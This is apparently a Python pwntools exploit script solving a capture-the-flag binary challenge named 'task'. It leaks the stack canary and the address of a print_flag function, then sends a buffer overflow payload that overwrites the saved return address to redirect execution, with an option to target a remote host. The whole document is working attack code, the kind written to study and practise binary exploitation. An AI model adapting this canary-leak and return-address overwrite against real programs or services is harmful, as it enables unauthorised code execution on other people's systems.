from pwn import *

elf = context.binary = ELF('./task')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *vuln+167",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path)

p.sendlineafter(b'What is the end of this story? \n', b"adminAAA" + b'A'*8)
leak = p.recvline().strip()
print(f'Leak {leak}')
leak = leak[leak.index(b'adminAAA')+8:]
try:
	cookie = u64(leak[:8])
	cookie &= 0xFFFFFFFFFFFFFF00
except:
	print("cookie leak failed")
	exit(1)

print(f"Cookie: {hex(cookie)}")
print_flag = int(leak.split(b':')[-1], 16)
print(f"print_flag: {hex(print_flag)}")
RET = print_flag + 168

payload = b'A' * 8
payload += p64(cookie)
payload += b'FAKE_RBP'
payload += p64(RET)
payload += p64(print_flag)

if b'\x0a' in payload:
	print("Repeat, banned char")
	exit(1)

p.sendline(payload)
# p.interactive()

print(p.clean(1.0))
